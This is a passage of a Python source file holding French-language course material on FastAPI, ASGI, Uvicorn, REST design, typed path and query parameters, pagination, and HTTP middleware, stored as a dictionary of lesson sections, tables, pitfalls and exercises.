"""
Manuel de Référence Approfondi — Volume II : FastAPI, ASGI & Pydantic v2 (Jours 2 et 3).
Ouvrage d'ingénierie logicielle couvrant :
- context : problématique architecturale et enjeux de production
- deep_sections : monographies techniques approfondies (ASGI 3.0, Uvicorn, Starlette, Pydantic v2, RFC 7807, SQLite ACID)
- architecture_diagram : topologie mémoire ou trame réseau ASCII
- reference_table : matrice de synthèse normative
- pitfalls : anti-patterns de production vs standards industriels
- practical_exercises : travaux pratiques progressifs post-bootcamp
"""

ENRICHMENT_D2_D3 = {
    # =========================================================================
    # JOUR 2 — CHAPITRE 2.1 : SERVEUR MINIMAL FASTAPI, ASGI, UVICORN & TABLE DE ROUTAGE
    # =========================================================================
    "d2-l1": {
        "context": (
            "Après avoir établi le modèle mémoire de CPython au Jour 0 et disséqué la pile protocolaire TCP/HTTP/JSON "
            "au Jour 1, nous franchissons ici le seuil fondateur de l'ingénierie backend : transformer un interpréteur "
            "Python en un **démon réseau asynchrone** capable de servir des milliers de clients simultanés avec "
            "**FastAPI** et **Uvicorn**.\n\n"
            "Pourquoi FastAPI s'est-il imposé en quelques années comme l'étalon industriel des architectures Python chez "
            "les éditeurs cloud, les banques numériques et les plateformes d'intelligence artificielle ? Parce qu'il "
            "unifie trois briques autrefois disjointes : un noyau HTTP asynchrone ultra-léger (**Starlette** sur le "
            "protocole **ASGI 3.0**), un moteur de validation compilé en Rust (**Pydantic v2 / `pydantic-core`**) et la "
            "synthèse automatique du contrat **OpenAPI 3.1**. Ce chapitre examine sous le capot comment Uvicorn "
            "orchestre les sockets POSIX et comment FastAPI résout chaque requête à travers `app.routes`."
        ),
        "deep_sections": [
            {
                "heading": "1. Du script éphémère au démon réseau : socket POSIX d'écoute et boucle d'événements Uvicorn",
                "body": (
                    "Un programme Python ordinaire suit une trajectoire linéaire et mortelle : l'interpréteur charge le "
                    "fichier `.py`, exécute séquentiellement ses instructions du haut vers le bas, puis restitue sa "
                    "mémoire vive au noyau Linux en terminant son processus avec le code `0`. Un serveur d'API obéit à "
                    "une physique inverse : il doit demeurer résident en mémoire 24h/24 sous la forme d'un **processus "
                    "démon (*daemon*)** attentif aux interruptions réseau.\n\n"
                    "#### Ouverture du descripteur TCP et multiplexage E/S non bloquant (`epoll` / `uvloop`)\n\n"
                    "Lorsque vous invoquez `uvicorn.run(app, host=\"0.0.0.0\", port=8000)`, Uvicorn demande au noyau du "
                    "système d'exploitation la création d'un socket TCP (`AF_INET`, `SOCK_STREAM`), l'attache par "
                    "`bind()` au port `8000` sur toutes les interfaces réseau, puis le bascule en mode passif via "
                    "`listen()`. Plutôt que d'immobiliser un fil d'exécution système (*OS thread*) par client connecté "
                    "comme le faisaient les serveurs historiques, Uvicorn démarre une **boucle d'événements asynchrone "
                    "(`asyncio` accélérée en C par `uvloop`)** adossée à l'appel système Linux `epoll`.\n\n"
                    "Dès que des octets franchissent la carte réseau, l'analyseur syntaxique C `httptools` découpe la "
                    "trame HTTP/1.1 en quelques microsecondes, puis Uvicorn invoque votre instance `FastAPI` sans jamais "
                    "interrompre la surveillance des centaines d'autres connexions actives sur le même processus."
                )
            },
            {
                "heading": "2. Anatomie du protocole ASGI 3.0 (`scope`, `receive`, `send`) et modèle d'exécution dual",
                "body": (
                    "Pendant près de quinze ans, les frameworks Web Python (Flask, Django historique) ont communiqué "
                    "avec leur serveur HTTP via la norme synchrone **WSGI (PEP 3333)**. WSGI souffrait d'une limite "
                    "structurelle : un appel `environ -> start_response` est strictement bloquant ; si une requête "
                    "attend 400 millisecondes une réponse PostgreSQL ou un microservice externe, le thread entier reste "
                    "paralysé et incapable de gérer des protocoles bidirectionnels comme les WebSockets.\n\n"
                    "> « Une application ASGI 3.0 est une coroutine unique prenant trois arguments `(scope, receive, send)` qui découple la métadonnée de connexion du flux asynchrone d'événements entrants et sortants. » — Spécification ASGI 3.0 (Django Channels / Starlette)\n\n"
                    "```python — Signature bas niveau que toute instance FastAPI expose à Uvicorn\n"
                    "async def app(scope: dict, receive: Callable, send: Callable) -> None:\n"
                    "    # scope['type'] == 'http', scope['method'] == 'GET', scope['path'] == '/api/v1/sante'\n"
                    "    event = await receive()  # {'type': 'http.request', 'body': b'', 'more_body': False}\n"
                    "    await send({'type': 'http.response.start', 'status': 200, 'headers': [(b'content-type', b'application/json')]})\n"
                    "    await send({'type': 'http.response.body', 'body': b'{\"statut\":\"OK\"}'}) \n"
                    "```\n\n"
                    "#### L'arbitrage subtil de FastAPI entre `async def` et `def` standard\n\n"
                    "FastAPI inspecte la nature de chaque fonction de route à l'enregistrement dans `app.routes`. Si "
                    "vous déclarez `async def lister():`, FastAPI l'exécute directement sur la boucle d'événements "
                    "principale d'Uvicorn — offrant une scalabilité maximale à condition de n'y utiliser que des "
                    "bibliothèques non bloquantes (`await`). Si en revanche vous utilisez un pilote synchrone comme "
                    "`sqlite3` standard et déclarez `def lister():` (sans `async`), FastAPI délègue automatiquement son "
                    "exécution à un pool de threads dédié (`anyio.to_thread.run_sync`) afin de protéger la boucle ASGI "
                    "contre tout gel accidentel !\n\n"
                    "> [!WARNING] L'erreur cardinale en ASGI : bloquer l'Event Loop dans une route `async def`\n"
                    "> Appeler `time.sleep(5)` ou `requests.get(url)` à l'intérieur d'une coroutine `async def` fige intégralement l'unique thread de la boucle d'événements du worker Uvicorn : plus aucun autre client ne reçoit le moindre octet pendant 5 secondes. Dans `async def`, toute attente d'entrée/sortie doit céder la main par `await` (`asyncio.sleep`, `httpx.AsyncClient`)."
                )
            },
            {
                "heading": "3. Table de routage `app.routes` et pipeline de sérialisation (`jsonable_encoder` vs `HTMLResponse`)",
                "body": (
                    "Chaque décorateur `@app.get(\"/api/v1/formations\")` ou `@app.post(\"/api/v1/formations\")` instancie "
                    "au démarrage un objet `APIRoute` compilé dans la liste ordonnée `app.routes`. Lorsqu'une requête "
                    "franchit Starlette, le routeur parcourt séquentiellement ces règles : si le chemin correspond "
                    "ainsi que le verbe HTTP, la fonction cible est appelée ; si le chemin existe mais pour un autre "
                    "verbe (par exemple `DELETE` sur une route exclusivement `GET`), Starlette répond automatiquement "
                    "`405 Method Not Allowed` ; si aucun motif ne correspond, il émet `404 Not Found`.\n\n"
                    "En sortie de fonction, FastAPI épargne au développeur toute conversion manuelle : dès qu'une route "
                    "retourne un `dict`, une `list`, un scalaire ou une instance Pydantic `BaseModel`, FastAPI traverse "
                    "récursivement la structure via `jsonable_encoder` (convertissant au passage les types Python `datetime`, "
                    "`UUID` ou `Decimal` en représentations compatibles JSON), sérialise les octets UTF-8 et expédie un "
                    "`JSONResponse` muni de l'en-tête normatif `content-type: application/json`. Pour servir ponctuellement "
                    "une interface Web humaine, il suffit de substituer `response_class=HTMLResponse` combiné au moteur "
                    "`Jinja2Templates`."
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE D'AIGUILLAGE D'UNE REQUÊTE DANS FASTAPI (ASGI & APP.ROUTES)\n"
            "  Client HTTP (GET /api/v1/sante)\n"
            "        |\n"
            "        v\n"
            "  [Socket TCP :8000 (Serveur ASGI Uvicorn)]\n"
            "        |  (Construit le dictionnaire ASGI 'scope' + canaux 'receive'/'send')\n"
            "        v\n"
            "  [app = FastAPI()] ---> Consulte app.routes :\n"
            "                           - '/api/v1/sante'      [GET] -> etat_sante()\n"
            "                           - '/api/v1/formations' [GET] -> lister()\n"
            "        |\n"
            "        v\n"
            "  Exécute etat_sante() ---> return {...} ---> JSONResponse 200 OK (content-type: application/json)"
        ),
        "reference_table": {
            "title": "Composants Fondamentaux d'une Application FastAPI Minimale",
            "headers": ["Élément de code", "Rôle technique exact", "Que se passe-t-il si on l'omet ?"],
            "rows": [
                ["`app = FastAPI(title=..., version=...)`", "Instancie l'application ASGI et génère `/openapi.json` et `/docs`", "Impossible de déclarer des routes `@app.get` / `@app.post`"],
                ["`@app.get(\"/url\")` / `@app.post(\"/url\")`", "Enregistre le couple `(URL, Méthode HTTP)` dans `app.routes`", "La fonction reste une fonction Python ordinaire inaccessible par HTTP (`404`)"],
                ["`return {\"statut\": \"OK\"}`", "Sérialise automatiquement en JSON + ajoute `content-type: application/json`", "Si on omet `return`, la fonction renvoie `None` (`null` en JSON)"],
                ["`TestClient(app)`", "Exécute des requêtes HTTP de test en mémoire via ASGI sans ouvrir de port", "Obligé de lancer `uvicorn` manuellement pour tester ses routes"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Nommer son propre fichier `fastapi.py` ou `uvicorn.py` dans le dossier de travail",
                "good": "Nommer ses fichiers `app.py`, `main.py` ou `01_serveur_minimal_fastapi.py`",
                "why": "Si votre fichier s'appelle `fastapi.py`, l'instruction `from fastapi import FastAPI` importera votre propre fichier au lieu de la bibliothèque FastAPI (`ImportError`) !"
            },
            {
                "bad": "Appeler une bibliothèque réseau synchrone bloquante (`time.sleep(5)`) à l'intérieur d'une fonction `async def`",
                "good": "Utiliser `await asyncio.sleep(...)` / `httpx.AsyncClient` dans `async def`, ou déclarer la route avec `def` standard (que FastAPI exécute dans un threadpool)",
                "why": "Un appel bloquant synchrone dans `async def` fige la boucle d'événements `asyncio` d'Uvicorn pour tous les clients !"
            }
        ],
        "practical_exercises": [
            "Exécutez le script dans l'atelier ci-dessus afin d'inspecter le contenu exact de `app.routes` et d'observer les routes documentaires (`/openapi.json`, `/docs`, `/redoc`) greffées nativement par FastAPI.",
            "Ajoutez une route `@app.get(\"/api/v1/version\")` retournant `{\"version\": app.version}` puis vérifiez avec `TestClient(app)` son code de statut et son en-tête `content-type`."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.2 : MATURITÉ REST (RICHARDSON) & PARAMÈTRES TYPÉS FASTAPI
    # =========================================================================
    "d2-l2": {
        "context": (
            "Exposer une fonction Python qui répond du JSON sur `/api/executerOperation` ne suffit nullement à "
            "construire une architecture **RESTful** pérenne. Lorsque le catalogue d'une institution s'étend sur deux "
            "cents endpoints consommés par dix équipes externes, l'absence de grammaire d'URL rigoureuse transforme "
            "rapidement le système d'information en un labyrinthe imprévisible.\n\n"
            "Comment les grandes plateformes d'ingénierie (Stripe, GitHub, Google Cloud, Kubernetes) structurent-elles "
            "leur espace d'adressage pour qu'un architecte externe devine l'intégralité du contrat sans même ouvrir la "
            "documentation ? Et par quel mécanisme interne FastAPI extrait-il, convertit-il et valide-t-il les segments "
            "dynamiques d'un chemin (`/formations/42`) ainsi que les prédicats de filtrage (`?salle=Alger&duree_min=3`) ? "
            "Ce chapitre formalise le **Modèle de Maturité de Richardson** et l'introspection déclarative `Path(...)` et `Query(...)`."
        ),
        "deep_sections": [
            {
                "heading": "1. Taxonomie architecturale : les quatre niveaux du Modèle de Maturité de Richardson",
                "body": (
                    "Formalisé par Leonard Richardson en 2008 pour évaluer la fidélité d'un service Web aux principes "
                    "REST de Roy Fielding, ce modèle gradue les APIs selon leur exploitation effective du protocole HTTP.\n\n"
                    "#### Du tunnel RPC opaque (Niveau 0) au standard industriel (Niveau 2)\n\n"
                    "Au **Niveau 0 (*The Swamp of POX*)**, l'API n'utilise HTTP que comme un tunnel de transport vers une "
                    "adresse unique (`POST /api/service`) recevant des enveloppes d'ordres hétérogènes telles que "
                    "`{\"action\": \"lireFormation\", \"id\": 5}` : le routage réseau, le cache HTTP et les journaux "
                    "d'accès deviennent aveugles. Le **Niveau 1** introduit la notion de **ressources nominales "
                    "individuelles** (`/api/v1/formations/5`), mais continue souvent de détourner `GET` ou `POST` pour "
                    "muter ou détruire des états.\n\n"
                    "Le **Niveau 2** incarne le **standard industriel universel** exigé en production : chaque URL "
                    "désigne exclusivement un **nom commun au pluriel** identifiant une collection ou une entité "
                    "(`/api/v1/formations`, `/api/v1/formations/42`), le **verbe HTTP** porte seul l'intention "
                    "d'opération (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`), et le **code de statut HTTP** (`200`, `201`, "
                    "`204`, `404`, `422`) traduit fidèlement son dénouement. Le **Niveau 3 (HATEOAS — *Hypermedia As The "
                    "Engine Of Application State*)** enrichit enfin chaque représentation de liens de transition "
                    "dynamiques (`_links`), précieux dans les workflows bancaires complexes."
                )
            },
            {
                "heading": "2. Arbitrage sémantique : Paramètres de Chemin (`Path`) face aux Paramètres de Requête (`Query`)",
                "body": (
                    "Une règle d'architecture immuable gouverne le partage des responsabilités entre le chemin hiérarchique "
                    "de l'URI et sa *Query String* située après le point d'interrogation `?`.\n\n"
                    "Le **paramètre de chemin (`@app.get(\"/api/v1/formations/{formation_id}\")`)** sert à **désigner de "
                    "manière univoque l'identité d'une ressource précise** au sein d'une collection (ou d'une sous-collection "
                    "telle que `/formations/{formation_id}/inscriptions`). Parce que le client réclame une entité "
                    "déterminée dont il affirme l'existence, son absence en base de données constitue une anomalie "
                    "d'adressage qui **doit lever `404 Not Found`**.\n\n"
                    "À l'inverse, tout argument de la fonction Python qui ne figure pas entre accolades dans le motif "
                    "d'URL est interprété par FastAPI comme un **paramètre de requête (`Query Parameter`)**, dédié au "
                    "**filtrage optionnel, à la recherche textuelle, au tri ou à la pagination** d'une collection "
                    "(`/api/v1/formations?salle=Alger&duree_min=3`). Lorsqu'un prédicat de recherche ne correspond à "
                    "aucun enregistrement, la collection `/formations` n'en existe pas moins : le serveur renvoie "
                    "impérativement **`200 OK` contenant un tableau vide `[]`**.\n\n"
                    "```python — Validation déclarative compilée par Pydantic TypeAdapter dans FastAPI\n"
                    "from fastapi import FastAPI, Path, Query\n\n"
                    "@app.get(\"/api/v1/stagiaires/{stagiaire_id}/factures\")\n"
                    "def lister_factures(\n"
                    "    stagiaire_id: int = Path(..., ge=1, description=\"Identifiant primaire du stagiaire\"),\n"
                    "    montant_min: float = Query(0.0, ge=0.0, description=\"Plancher de filtrage en DZD\"),\n"
                    "):\n"
                    "    return {\"stagiaire_id\": stagiaire_id, \"filtre_min\": montant_min}\n"
                    "```"
                )
            },
            {
                "heading": "3. Référentiel comparé des notations de variables de chemin (`{id}` vs `<int:id>` vs `:id`)",
                "body": (
                    "Les ingénieurs naviguant entre plusieurs écosystèmes rencontrent trois conventions syntaxiques "
                    "pour matérialiser un segment variable d'URL, dont le mélange provoque des bogues silencieux.\n\n"
                    "> « Un modèle d'URI (URI Template) encadre ses expressions variables par des accolades `{var}` afin de décrire de manière interopérable l'expansion d'identifiants de ressources. » — IETF RFC 6570 (URI Template, Section 1.2)\n\n"
                    "**FastAPI, Starlette et la norme OpenAPI 3.1** adoptent strictement la notation RFC 6570 à "
                    "**accolades `{formation_id}`** : le motif d'URL demeure purement déclaratif tandis que la coercition "
                    "de type (`int`, `UUID`, `str`) et les bornes (`Path(ge=1)`) sont portées par l'annotation de type "
                    "Python. **Flask (Werkzeug) et Django** recourent historiquement aux chevrons typés `<int:id>` : "
                    "écrire `<int:id>` dans FastAPI est une erreur grave, car Starlette traitera les caractères `<`, `:` "
                    "et `>` comme du texte littéral jamais atteint ! Enfin, la notation préfixée par deux-points **`:id`** "
                    "appartient aux routeurs JavaScript (*Express.js*), Go (*Gin*) ainsi qu'à l'interface cliente "
                    "**Postman** (qui substitue `:id` avant d'émettre la requête réelle sur le réseau)."
                )
            }
        ],
        "architecture_diagram": (
            "1. COMPARAISON ARCHITECTURALE : ANTI-PATTERN RPC vs STANDARD REST (NIVEAU 2)\n"
            "  [ANTI-PATTERN RPC]                       [STANDARD RESTFUL (Noms au pluriel + Verbes HTTP)]\n"
            "  GET  /api/getAllFormations       ===>    GET    /api/v1/formations\n"
            "  GET  /api/getFormationById?id=5  ===>    GET    /api/v1/formations/5\n"
            "  POST /api/createNewFormation     ===>    POST   /api/v1/formations\n"
            "  POST /api/updateFormation/5      ===>    PUT    /api/v1/formations/5\n"
            "  GET  /api/deleteFormation?id=5   ===>    DELETE /api/v1/formations/5\n\n"
            "2. TRADUCTION D'UNE VARIABLE DE CHEMIN SELON L'OUTIL :\n"
            "  - Dans le code serveur FastAPI : @app.get(\"/api/v1/formations/{id}\") (id: int) <-- Accolades {...}\n"
            "  - Dans le code serveur Flask   : @app.route(\"/api/v1/formations/<int:id>\")     <-- Chevrons <...>\n"
            "  - Dans l'interface Postman     : GET http://.../api/v1/formations/:id          <-- Deux-points :id\n"
            "  - Dans curl / Navigateur       : curl http://.../api/v1/formations/42          <-- Valeur réelle 42"
        ),
        "reference_table": {
            "title": "Synthèse : Extraction Déclarative dans FastAPI & Notations des Variables d'URL",
            "headers": ["Élément / Syntaxe", "Où est-il utilisé ?", "Exemple concret", "Comportement & Règle d'or"],
            "rows": [
                ["`{id}` + `id: int = Path(...)`", "**FastAPI (Starlette)** & **OpenAPI 3.1**", "`@app.get('/api/formations/{id}')`", "Valide le type (`int`, `float`, `UUID`, `str`) via Pydantic (`422` si invalide)"],
                ["`<int:id>`", "**Flask (Werkzeug)** & Django", "`@app.route('/api/formations/<int:id>')`", "Syntaxe propre à Flask (non reconnue par FastAPI)"],
                ["`:id`", "**Postman**, Express.js (Node), Rails", "`/api/formations/:id`", "Crée une variable de chemin dans Postman"],
                ["`Query(...)`", "Query String (après `?`)", "`page: int = Query(1, ge=1)`", "Extrait, convertit et valide les paramètres `?page=1`"],
                ["`Header(...)`", "En-têtes HTTP (`Headers`)", "`x_api_key: str = Header(alias='X-API-Key')`", "Extrait et valide un en-tête HTTP"],
                ["`payload: BaseModel`", "Corps (`Body` JSON)", "`def creer(payload: FormationCreate):`", "Parse et valide le corps JSON entrant via Pydantic v2"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écrire `@app.get('/api/formations/<int:id>')` ou `:id` dans une route FastAPI",
                "good": "Toujours utiliser les accolades `@app.get('/api/formations/{id}')` avec l'annotation `id: int` dans FastAPI",
                "why": "FastAPI utilise la syntaxe standard OpenAPI `{id}` et délègue la conversion de type à l'annotation Python `id: int`."
            },
            {
                "bad": "Mettre des verbes d'action dans les URLs : `/api/creer_formation`, `/api/listerFormations`",
                "good": "Utiliser uniquement des noms de ressources au pluriel (`/api/formations`) et laisser le décorateur (`@app.post`, `@app.get`) définir l'action",
                "why": "Respecter le Niveau 2 de Richardson évite la prolifération de centaines d'URLs incohérentes."
            },
            {
                "bad": "Renvoyer `404 Not Found` lorsqu'une recherche filtrée `GET /api/formations?salle=Tamanrasset` ne trouve aucun résultat",
                "good": "Renvoyer `200 OK` avec `{\"total\": 0, \"formations\": []}`",
                "why": "`404` sur une collection ferait croire au client que la route `/api/formations` n'existe plus ; une liste vide `[]` indique clairement qu'il n'y a aucun résultat pour ce filtre."
            }
        ],
        "practical_exercises": [
            "Exécutez le script dans l'atelier ci-dessus et inspectez la structure JSON détaillée (`loc`, `msg`, `type`) émise avec le statut `422` lorsque le client appelle `/api/v1/stagiaires/abc`.",
            "Interrogez l'endpoint `GET /api/sandbox/calcul-tva?ht=2500&taux=19` depuis le Client HTTP intégré puis testez un montant négatif `ht=-100` pour vérifier l'application de la borne déclarative."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.3 : PAGINATION (OFFSET/LIMIT), FILTRAGE & TRI
    # =========================================================================
    "d2-l3": {
        "context": (
            "En environnement de développement local, une table contenant six formations répond à un `SELECT *` en "
            "moins de cent microsecondes. Cette rapidité trompeuse masque l'une des causes les plus fréquentes "
            "d'effondrement en production : six mois après le lancement d'un portail national, la table des "
            "inscriptions ou des écritures comptables dépasse couramment **deux millions de lignes**.\n\n"
            "Une route `GET` dépourvue de pagination oblige alors le worker Uvicorn à rapatrier l'intégralité de la "
            "table en mémoire vive Python, à instancier des millions de dictionnaires `PyObject` et à sérialiser un "
            "bloc JSON de plusieurs centaines de mégaoctets jusqu'à ce que le noyau Linux abatte brutalement le "
            "processus (*OOM Killer — Out Of Memory*). La **Pagination bornée**, le **Filtrage préalable** et le "
            "**Tri validé par liste blanche** constituent par conséquent des invariants obligatoires de toute route "
            "de collection."
        ),
        "deep_sections": [
            {
                "heading": "1. Algèbre de la pagination `Offset / Limit` et calcul exact du plafond de pages",
                "body": (
                    "Le contrat classique de navigation par pages numérotées repose sur deux entiers transmis dans la "
                    "Query String : **`page`** (l'indice humain de la page désirée, débutant conventionnellement à `1`) "
                    "et **`limit`** (le cardinal maximal d'enregistrements par fenêtre, typiquement `10`, `20` ou `50`).\n\n"
                    "#### Décalage d'origine zéro (`offset`) et division entière par excès (`total_pages`)\n\n"
                    "Les tableaux Python comme la clause SQL `OFFSET` indexant leurs éléments à partir de `0`, la "
                    "conversion entre le numéro de page et le nombre d'éléments à ignorer obéit à l'identité "
                    "**`offset = (page - 1) * limit`** : pour `limit = 10`, la page `1` débute à l'indice `0` (`[0:10]`), "
                    "la page `2` saute les dix premiers éléments (`offset = 10`, tranche `[10:20]`), et ainsi de suite.\n\n"
                    "Afin de permettre aux interfaces Web et mobiles de dessiner leur barre de navigation sans erreur "
                    "d'arrondi ni recours fragile aux nombres flottants (`math.ceil`), le nombre total de pages se "
                    "calcule exclusivement en arithmétique entière via **`total_pages = max(1, (total_items + limit - 1) // limit)`**. "
                    "Ainsi, 21 éléments découpés par tranches de 10 donnent `(21 + 9) // 10 = 3` pages exactes, tandis "
                    "qu'une collection vide (`0` élément) conserve conventionnellement `total_pages = 1`."
                )
            },
            {
                "heading": "2. Bornage défensif déclaratif avec `Query(ge=..., le=...)` contre le déni de service mémoire",
                "body": (
                    "Implémenter la formule de pagination en écrivant naïvement `def lister(page: int = 1, limit: int = 10):` "
                    "laisse une brèche béante dans votre périmètre défensif : rien n'empêche un script malveillant "
                    "d'appeler `GET /api/v1/formations?page=-4&limit=999999999`. Un `page` négatif engendre en Python un "
                    "indiçage inversé par la fin de liste qui renvoie des données incohérentes, tandis qu'un `limit` "
                    "astronomique neutralise intégralement la pagination et restaure le risque d'épuisement RAM.\n\n"
                    "> [!IMPORTANT] Plafonner systématiquement `limit` dans le contrat Pydantic de la route\n"
                    "> Dans FastAPI, déclarez toujours `page: int = Query(1, ge=1)` et `limit: int = Query(10, ge=1, le=50)`. Le moteur Rust `pydantic-core` intercepte instantanément toute valeur hors bornes avant même l'entrée dans votre code métier, rejette l'appel avec `422 Unprocessable Entity` et publie les contraintes `minimum: 1, maximum: 50` dans le schéma OpenAPI 3.1."
                )
            },
            {
                "heading": "3. Ordre canonique du pipeline (Filtrer -> Trier -> Paginer) et Liste Blanche de tri",
                "body": (
                    "L'exactitude mathématique et l'efficacité CPU d'une route de collection dépendent strictement de "
                    "l'ordre d'exécution de ses trois transformations. Le serveur doit **premièrement filtrer** "
                    "l'ensemble selon les critères métier (`?salle=Alger`) et **mesurer immédiatement `total_items`** sur "
                    "ce sous-ensemble filtré ; calculer `total_items` après le découpage de la tranche renverrait "
                    "absurdement la taille de la page courante au lieu du volume total de résultats !\n\n"
                    "Le serveur **trie deuxièmement** ce sous-ensemble réduit, puis **découpe troisièmement** la "
                    "fenêtre `[offset : offset + limit]`. Pour sécuriser le paramètre dynamique `?tri=duree_jours&ordre=desc`, "
                    "on ne fait jamais confiance à la chaîne fournie par l'utilisateur : que le tri s'opère en Python "
                    "(`KeyError` potentielle ou exposition d'attributs internes) ou en SQL (`ORDER BY`, où les marqueurs "
                    "paramétrés `?` sont syntaxiquement interdits pour les noms de colonnes), le champ de tri doit être "
                    "contrôlé par un type `Literal[\"id\", \"duree_jours\", \"titre\"]` ou vérifié contre un ensemble "
                    "immuable (**Whitelist**) côté serveur."
                )
            }
        ],
        "architecture_diagram": (
            "PIPELINE DE TRAITEMENT D'UNE COLLECTION REST (GET /api/formations?salle=Alger&tri=duree_jours&ordre=desc&page=2&limit=2)\n\n"
            "  [Collection Complète (N éléments)] \n"
            "          |\n"
            "          v  1. FILTRAGE (?salle=Alger)\n"
            "  [Sous-ensemble filtré (total_items = 5)]\n"
            "          |\n"
            "          v  2. TRI SÉCURISÉ (?tri=duree_jours&ordre=desc via Whitelist)\n"
            "  [Sous-ensemble filtré et trié (5 éléments)]\n"
            "          |\n"
            "          v  3. DÉCOUPAGE PAGINATION (offset = (2-1)*2 = 2, tranche [2 : 4])\n"
            "  [Réponse JSON : {\"meta\": {\"total_items\": 5, \"page\": 2, \"total_pages\": 3, \"has_next\": true}, \"data\": [elem2, elem3]}]"
        ),
        "reference_table": {
            "title": "Structure Standard de l'Objet `meta` de Pagination dans une Réponse JSON",
            "headers": ["Clé JSON dans `meta`", "Type", "Formule / Déclaration en Python FastAPI", "Utilité pour l'interface cliente (Web / Mobile)"],
            "rows": [
                ["`total_items`", "`int`", "`len(resultats_filtres)` ou `SELECT COUNT(*)`", "Afficher « 48 formations trouvées »"],
                ["`page`", "`int`", "`page: int = Query(1, ge=1)`", "Mettre en surbrillance le numéro de page courant"],
                ["`limit`", "`int`", "`limit: int = Query(10, ge=1, le=50)`", "Connaître la taille de tranche appliquée"],
                ["`total_pages`", "`int`", "`max(1, (total_items + limit - 1) // limit)`", "Générer les boutons de pagination « Page 1 sur 5 »"],
                ["`has_next`", "`bool`", "`page < total_pages`", "Activer ou griser le bouton « Page suivante »"],
                ["`has_prev`", "`bool`", "`page > 1`", "Activer ou griser le bouton « Page précédente »"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Calculer `total_items` APRES avoir découpé la tranche `tranche = resultats[offset:offset+limit]`",
                "good": "Calculer `total_items = len(resultats)` sur les résultats filtrés AVANT le découpage de la page",
                "why": "Sinon `total_items` vaudra toujours `limit` (ex: 2) au lieu du nombre total réel d'enregistrements correspondant à la recherche !"
            },
            {
                "bad": "Trier AVANT de filtrer sur de grands volumes de données",
                "good": "Toujours **Filtrer d'abord**, puis **Trier**, puis **Paginer**",
                "why": "Trier 100 000 lignes pour n'en garder que 10 après filtrage gaspille 99 % du temps processeur."
            }
        ],
        "practical_exercises": [
            "Dans l'exécuteur Python ci-dessus, parcourez successivement `page=1`, `page=2` et `page=3` avec `limit=2` et vérifiez la bascule des indicateurs booléens `has_prev` et `has_next`.",
            "Utilisez le bouton « Tester avec Pagination & Tri » pour appeler `GET /api/sandbox/formations?page=1&limit=2&tri=duree_jours&ordre=desc`, puis tentez `limit=500` afin d'observer le rejet défensif."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.4 : MIDDLEWARE HTTP ASYNCHRONE (@APP.MIDDLEWARE("HTTP"))
    # =========================================================================
    "d2-l4": {
        "context": (
            "À mesure qu'une plateforme API s'étoffe pour atteindre cinquante ou cent cinquante routes métier, des "
            "exigences transversales d'exploitation apparaissent : chronométrer à la microseconde la latence réelle de "
            "chaque transaction, estampiller chaque appel d'un identifiant de corrélation distribué (`X-Request-ID`), "
            "sceller des en-têtes de durcissement navigateur (`X-Content-Type-Options: nosniff`) et alimenter un "
            "journal d'audit normalisé.\n\n"
            "Dupliquer cette plomberie d'observabilité au sein de chaque fonction de route violerait frontalement la "
            "séparation des préoccupations. L'architecture ASGI résout élégamment ce problème par le patron du "
            "**Middleware en pelures d'oignon (*Onion Architecture*)** : dans FastAPI, `@app.middleware(\"http\")` "
            "enveloppe l'intégralité du trafic entrant et sortant autour d'un point de pivot asynchrone unique : "
            "`response = await call_next(request)`."
        ),
        "deep_sections": [
            {
                "heading": "1. Modèle en couches concentriques ASGI et anatomie de `await call_next(request)`",
                "body": (
                    "Dans Starlette et FastAPI, chaque middleware constitue une enveloppe asynchrone entourant "
                    "l'application interne. Lorsqu'une requête HTTP franchit Uvicorn, elle traverse les middlewares de "
                    "l'extérieur vers l'intérieur jusqu'à la route métier, puis la réponse remonte ces mêmes couches en "
                    "sens inverse avant d'être écrite sur le socket TCP.\n\n"
                    "#### Chronométrie monotone (`time.perf_counter()`) et contrat de retour\n\n"
                    "À l'intérieur de `async def audit_middleware(request: Request, call_next):`, tout le code placé "
                    "**avant** `await call_next(request)` forme la **phase d'interception amont** : on y démarre une "
                    "horloge monotone haute résolution via `time.perf_counter()` (qui, contrairement à `time.time()`, "
                    "possède une précision sub-microseconde et ne recule jamais lors d'une resynchronisation horaire NTP "
                    "du serveur Linux) et on extrait ou forge l'identifiant de trace.\n\n"
                    "L'expression `response = await call_next(request)` suspend le middleware pendant que le routeur, "
                    "les dépendances `Depends()` et la route métier s'exécutent. Dès que `response` revient, la **phase "
                    "aval** calcule le temps écoulé, enrichit le dictionnaire mutable `response.headers`, émet une trace "
                    "structurée dans les journaux d'audit et **retourne impérativement `response`** au serveur ASGI."
                )
            },
            {
                "heading": "2. Concurrence coopérative et isolation mémoire par requête via `request.state`",
                "body": (
                    "Un piège redoutable guette les développeurs habitués aux scripts séquentiels lorsqu'ils souhaitent "
                    "transmettre une donnée calculée dans le middleware (comme `request_id` ou l'empreinte du client) à "
                    "la fonction de route : stocker cette valeur dans une variable globale du module Python.\n\n"
                    "> [!WARNING] Conditions de course (*Race Conditions*) sur une boucle `asyncio` partagée\n"
                    "> Sur un worker Uvicorn traitant 200 requêtes simultanées, dès que la requête A cède la main sur un `await` (lecture SQL ou appel HTTP), la boucle d'événements exécute le middleware de la requête B sur le même thread. Si `CURRENT_REQUEST_ID` était une variable globale, la requête B écraserait instantanément l'identifiant de la requête A, corrompant vos journaux d'audit financiers !\n\n"
                    "La solution architecturale fournie par Starlette réside dans le conteneur **`request.state`** "
                    "(adossé au dictionnaire `scope[\"state\"]` propre à chaque connexion ASGI). Toute valeur attachée "
                    "par `request.state.request_id = req_id` vit dans un espace mémoire strictement isolé pour la durée "
                    "exacte de cette requête, puis est libérée par le ramasse-miettes dès l'envoi de la réponse."
                )
            },
            {
                "heading": "3. Traçabilité distribuée en production : le patron industriel du `X-Request-ID`",
                "body": (
                    "Dans un système d'information bancaire ou ministériel où une requête traverse successivement un "
                    "répartiteur Nginx, une passerelle FastAPI et trois microservices internes, diagnostiquer un incident "
                    "signalé par un usager devient impossible si l'on ne dispose que d'horodatages approximatifs noyés "
                    "dans des gigaoctets de logs.\n\n"
